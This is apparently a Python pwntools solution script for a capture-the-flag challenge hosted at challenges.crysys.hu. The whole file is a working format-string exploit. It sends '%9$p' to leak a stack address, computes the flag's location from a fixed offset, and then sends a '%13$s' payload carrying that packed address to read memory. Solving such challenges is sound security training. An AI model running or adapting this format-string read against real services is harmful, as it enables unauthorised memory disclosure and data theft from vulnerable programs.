import re
import pwn


def get_flag_address(conn):
    conn.recvline()

    exploit = f'%9$p'.encode('ascii')
    conn.sendline(exploit)

    conn.recvline()
    conn.recvline()
    return_address = conn.recvline()
    conn.recvline()
    conn.recvline()

    # the flag is 0x2d15 far from the address we got with printing %9$p
    return int(return_address, 16) + 0x2d15


def get_string(conn, string_address):

    qqq = re.findall('..', hex(string_address))[1:]
    qqq = qqq[::-1]

    # the 13th parameter (8bytes) on the stack will be exactly the address we provide
    # the first half of the exploit is 8 bytes long so that the address is properly aligned to the next 8 bytes boundary

    exploit = b'%13$s   ' + bytes([int(b, 16) for b in qqq])
    conn.sendline(exploit)

    e = conn.recvline()
    e = conn.recvline()
    e = conn.recvline()
    return e.decode('ascii')


def solve():
    conn = pwn.remote('challenges.crysys.hu', 5006)

    flag_address = get_flag_address(conn)
    flag = get_string(conn, flag_address)

    conn.close()

    return flag


if __name__ == "__main__":
    print(solve())

